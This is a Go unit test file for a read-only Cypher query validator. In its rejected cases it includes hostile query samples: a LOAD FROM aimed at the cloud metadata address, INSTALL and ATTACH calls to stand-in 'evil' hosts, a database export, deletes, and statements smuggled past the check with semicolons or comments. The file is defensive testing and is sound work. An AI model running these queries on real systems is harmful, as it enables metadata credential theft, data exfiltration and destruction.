package graphquery

import "testing"

func TestIsReadOnly(t *testing.T) {
	tests := []struct {
		name string
		q    string
		want bool
	}{
		// Legitimate read queries (mirror the shapes in named_queries.go).
		{"simple match", "MATCH (n:Asset) RETURN n LIMIT 10", true},
		{"optional match", "OPTIONAL MATCH (n:Asset)-[r]->(m) RETURN n, r, m", true},
		{"with chain", "WITH 1 AS x MATCH (n) WHERE n.score > x RETURN n", true},
		{"unwind", "UNWIND [1,2,3] AS x RETURN x", true},
		{"return only", "RETURN 1", true},
		{"lowercase", "match (n:Asset) return n", true},
		{"leading whitespace/newlines", "\n  MATCH (n) RETURN n", true},
		{"trailing semicolon ok", "MATCH (n) RETURN n;", true},
		// Literal content must not trip the keyword checks.
		{"write keyword inside string literal", "MATCH (n) WHERE n.name = 'DROP TABLE lb' RETURN n", true},
		{"forbidden word in property name context", "MATCH (n) WHERE n.name = 'SET' RETURN n", true},
		{"load balancer in literal", "MATCH (n) WHERE n.name CONTAINS 'load balancer' RETURN n", true},

		// Classic write/DDL — rejected.
		{"create", "CREATE (n:Asset {id: 'x'})", false},
		{"match then set", "MATCH (n) SET n.score = 100 RETURN n", false},
		{"detach delete", "MATCH (n) DETACH DELETE n", false},
		{"merge", "MERGE (n:Asset {id:'x'})", false},
		{"remove", "MATCH (n) REMOVE n.score", false},

		// LadybugDB IO + DDL statements a denylist misses — the whole point.
		{"load from url", "LOAD FROM 'http://169.254.169.254/latest/meta-data/' RETURN *", false},
		{"install extension", "INSTALL httpfs FROM 'http://evil/'", false},
		{"load extension", "LOAD EXTENSION httpfs", false},
		{"attach", "ATTACH 'pg://evil' AS x (DBTYPE POSTGRES)", false},
		{"export database", "EXPORT DATABASE '/tmp/dump'", false},
		{"import database", "IMPORT DATABASE '/tmp/dump'", false},
		{"use db", "USE evil", false},
		{"bare call proc", "CALL show_tables() RETURN *", false},
		{"call config set", "CALL threads=4", false},
		{"copy", "COPY assets FROM '/tmp/x.csv'", false},

		// Comment-masking and statement-smuggling.
		{"comment before load", "// harmless\nLOAD FROM 'x' RETURN *", false},
		{"block comment masking start", "/* MATCH */ LOAD FROM 'x' RETURN *", false},
		{"smuggled second statement", "MATCH (n) RETURN n; LOAD FROM 'x' RETURN *", false},
		{"smuggled write after semicolon", "RETURN 1; CREATE (n)", false},
		{"load hidden in trailing comment does not save a write", "MATCH (n) SET n.x=1 // RETURN n", false},

		// Ordinary read-only shapes the engine runs correctly
		// (graphstore/engine_shapes_test.go pins their answers; the cypher pool
		// caps path depth in the engine).
		{"variable-length path", "MATCH (a)-[*1..3]->(b) RETURN b", true},
		{"variable-length typed path", "MATCH (a)-[:CanAssume*1..4]->(b) RETURN b", true},
		{"label function", "MATCH (n) RETURN label(n)", true},
		{"untyped relationship", "MATCH (a)-[]->(b) RETURN b", true},
		{"union with param in-list", "MATCH (n) WHERE n.id IN $ids RETURN n UNION MATCH (m) RETURN m", true},

		// Legit shapes that superficially resemble the crash patterns but are safe.
		{"typed variable relationship not untyped", "MATCH (a)-[r:CanAssume]->(b) RETURN r", true},
		{"empty list literal in IN is not an untyped rel", "MATCH (n) WHERE n.id IN [] RETURN n", true},
		{"plain union without param in-list", "MATCH (n:Asset) RETURN n UNION MATCH (m:IamRole) RETURN m", true},
		{"plain param in-list without union", "MATCH (n) WHERE n.id IN $ids RETURN n", true},
		{"list literal in unwind not a path", "UNWIND [1,2,3] AS x RETURN x", true},
		{"crash pattern inside string literal is safe", "MATCH (n) WHERE n.name = 'a-[]->b' RETURN n", true},

		// Degenerate input.
		{"empty", "", false},
		{"whitespace only", "   \n\t ", false},
		{"comment only", "// just a comment", false},
		{"does not start with a reading clause", "FOREACH (x IN [] | SET x.y = 1)", false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := IsReadOnly(tt.q); got != tt.want {
				t.Errorf("IsReadOnly(%q) = %v, want %v", tt.q, got, tt.want)
			}
		})
	}
}

func TestForbiddenReportsKeyword(t *testing.T) {
	if kw := Forbidden("MATCH (n) SET n.x = 1"); kw != "SET" {
		t.Errorf("Forbidden = %q, want SET", kw)
	}
	if kw := Forbidden("LOAD FROM 'x' RETURN *"); kw != "LOAD" {
		t.Errorf("Forbidden = %q, want LOAD", kw)
	}
	if kw := Forbidden("MATCH (n) RETURN n"); kw != "" {
		t.Errorf("Forbidden = %q, want empty", kw)
	}
}
